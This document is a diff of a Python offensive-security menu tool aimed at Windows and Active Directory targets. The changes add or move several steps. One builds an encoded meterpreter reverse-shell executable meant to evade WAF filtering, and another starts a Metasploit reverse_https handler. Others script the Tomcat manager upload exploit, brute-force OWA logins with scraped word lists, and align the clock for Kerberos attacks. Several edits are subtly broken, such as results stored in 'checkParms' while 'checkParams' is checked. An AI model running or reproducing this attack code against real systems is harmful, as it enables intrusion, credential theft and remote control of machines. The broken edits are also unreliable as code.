@@ -554,15 +554,15 @@ def display():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS  SERVER (12) Synchronize Time (23) Get Arch (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Boot HTTP Server (25) Services (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Boot SMB  Server (26) AT  Exec (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF Tomcat (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF RShell (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS  SERVER (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Start HTTPServer (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) MSFCon Rev Shell (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) PS  Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSFCon TOM (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) SMB Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSFCon OWA (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) RemDesktop (98)          " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
@@ -765,21 +765,6 @@ while True:
    if selection =='0':   
       checkParams = testOne()      
       
-      if checkParams != 1:
-            print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
-            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
-            PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
-            POR = spacePadding(PTS, COL1)
-
-            if POR[:1] == "":
-               print("[+] Unable to enumerate any port information, good luck!!...")
-            else:
-               print("[+] Found live ports...\n")
-               print(colored(PTS,colour6) + "\n") 
-
-# -----   
-   
-      checkParams = testOne()      
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
@@ -1151,38 +1136,7 @@ while True:
       if TSH != "":
          TSH = spacePadding(TSH,COL1)
       else:
-         TSH = BAK
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                           
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Reset local TIME to match kerberos skew. 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '12':
-      checkParams = testOne()
-      
-      if checkParams != 1:
-         checkParams = testFour("88")
-
-      if checkParams != 1:
-         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
-         dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
-      
-         if dateTime != "":
-            date, time = dateTime.split(" ")
-            time = time.rstrip(")")
-            print("[+] Synchronised with remote server...\n")
-            command("timedatectl set-time " + date)
-            command("date --set=" + time)
-            LTM = time
-            SKEW = 1
-         else:
-            print("[-] Server synchronisation did not occur...")
-                 
-      prompt()
+         TSH = BAK    
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1193,7 +1147,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '13':
+   if selection == '12':
       checkParams = getPort()
       
       if checkParams != 1:
@@ -1237,6 +1191,8 @@ while True:
          
          # ANTI WAF ----         
          command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 5 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + httpDir + "/win_encoded_shell.exe > arsenal.tmp 2>&1")
+         
+         command("chmod +X *.*")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1247,7 +1203,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '14':
+   if selection == '13':
       HTTP = getPort()
       
       if HTTP != 1:
@@ -1265,12 +1221,38 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '15':
+   if selection == '14':
       command("xdotool key Ctrl+Shift+T")
       command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
       command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
       command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
-      command("xdotool key Ctrl+Tab")            
+      command("xdotool key Ctrl+Tab")
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Start metersploit shell server
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='15':
+      checkParams = getPort()
+      
+      if checkParams != 1:        
+         with open("meterpreter.rc", "w") as write:
+            write.write("use exploit/multi/handler\n")
+            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")
+            write.write("set LHOST " + localIP + "\n")
+            write.write("set LPORT " + checkParams + "\n")
+            write.write("clear\n")
+            write.write("cat " + dataDir + "/banner4.txt\n")
+            write.write("run\n")
+            
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
+         command("xdotool key Ctrl+Tab")            
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1411,6 +1393,37 @@ while True:
       prompt()
       
 # ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                           
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Reset local TIME to match kerberos skew. 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '23':
+      checkParams = testOne()
+      
+      if checkParams != 1:
+         checkParams = testFour("88")
+
+      if checkParams != 1:
+         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
+         dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
+      
+         if dateTime != "":
+            date, time = dateTime.split(" ")
+            time = time.rstrip(")")
+            print("[+] Synchronised with remote server...\n")
+            command("timedatectl set-time " + date)
+            command("date --set=" + time)
+            LTM = time
+            SKEW = 1
+         else:
+            print("[-] Server synchronisation did not occur...")
+                 
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
@@ -1419,7 +1432,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '23':
+   if selection == '24':
       checkParams = testOne()
       
       if checkParams != 1:
@@ -1445,7 +1458,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='24':
+   if selection =='25':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -1460,7 +1473,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='25':
+   if selection =='26':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -1475,7 +1488,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '26':
+   if selection == '27':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -1490,7 +1503,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '27':
+   if selection == '28':
       checkParams = testTwo()       
         
       if checkParams != 1:
@@ -1505,7 +1518,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '28':
+   if selection == '29':
       checkParams = testTwo()        
        
       if checkParams != 1:
@@ -1520,7 +1533,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '29':
+   if selection == '30':
       checkParams = testTwo()      
       
       if checkParams != 1:
@@ -1535,23 +1548,12 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '30':
+   if selection == '31':
       checkParams = testTwo()
       
       if checkParams != 1:
          command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '31':
-      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2807,7 +2809,7 @@ while True:
       checkParams = testOne()   
       
       if checkParams != 1:
-         if WEB[:1] != "":
+         if WEB[:5] != "EMPTY":
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
             print("[+] User list generated via website...")
          else:
@@ -2819,7 +2821,13 @@ while True:
             command("sed -i '/#/d' usernames.txt 2>&1")
             command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
             command("sed -i '/---------------------/d' usernames.txt 2>&1")
-            print("[+] Adding NCrack minimal.usr list as well...")
+
+            if os.path.exists("/usr/share/ncrack/minimal.usr"):
+               print("[+] Adding NCrack minimal.usr list as well...")
+               command("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
+               command("sed -i '/#/d' " + dataDir + "/passwords.txt 2>&1")
+               command("sed -i '/Email addresses found/d' " + dataDir + "/passwords.txt 2>&1")
+               command("sed -i '/---------------------/d' " + dataDir + "/passwords.txt 2>&1")
             
          for x in range (0,maxUser):
             USER[x] = linecache.getline(dataDir + "/usernames.txt", x+1).rstrip(" ")
@@ -2844,15 +2852,7 @@ while True:
             print("[+] Password list generated via website...")
          else:
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + TIP.rstrip(" ") + " 2>&1")
-            print("[+] Password list generated via ip address...")
-            
-         if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            print("[+] Adding NCrack minimal.usr list as well...")
-            command("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/#/d' " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/Email addresses found/d' " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/---------------------/d' " + dataDir + "/passwords.txt 2>&1")
-            
+            print("[+] Password list generated via ip address...")            
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -3266,7 +3266,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
-      checkParams = getPort()
+      checkParms = testFour("80")
       
       if checkParams != 1:
          print("[*] Starting metasploit server...")
@@ -3274,7 +3274,6 @@ while True:
          with open("meterpreter.rc", "w") as write:
             write.write("use exploit/multi/http/tomcat_mgr_upload\n")
             write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
-            write.write("set RPORT " + checkParms + "\n")
             DATA = PAS.rstrip(" ")
             write.write("set HttpPassword " + DATA + "\n")
             DATA = USR.rstrip(" ")
@@ -3290,35 +3289,39 @@ while True:
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-         command("xdotool key Ctrl+Tab")      
-      prompt()
-
+         command("xdotool key Ctrl+Tab")
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Start metersploit shell server
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='85':
-      checkParams = getPort()
+   if selection == '85':
+      checkParms = testFour("443")
       
-      if checkParams != 1:        
+      if checkParams != 1:
+         print("[*] Starting metasploit server...")
+         
          with open("meterpreter.rc", "w") as write:
-            write.write("use exploit/multi/handler\n")
-            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")
-            write.write("set LHOST " + localIP + "\n")
-            write.write("set LPORT " + checkParams + "\n")
-            write.write("clear\n")
-            write.write("cat " + dataDir + "/banner4.txt\n")
+            write.write("use auxiliary/scanner/http/owa_ews_login\n")
+            write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
+            write.write("set USER_FILE " + dataDir + "/usernames.txt\n")
+            write.write("set PASS_FILE " + dataDir + "/passwords.txt\n")
+            command("hostname -I >> temp.tmp")
+            target = linecache.getline("temp.tmp",1)
+            one, two, three, four = target.split(" ")
+            target = two.rstrip(" ")
+            write.write("set lhost " + target + "\n")
             write.write("run\n")
-            
+   
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
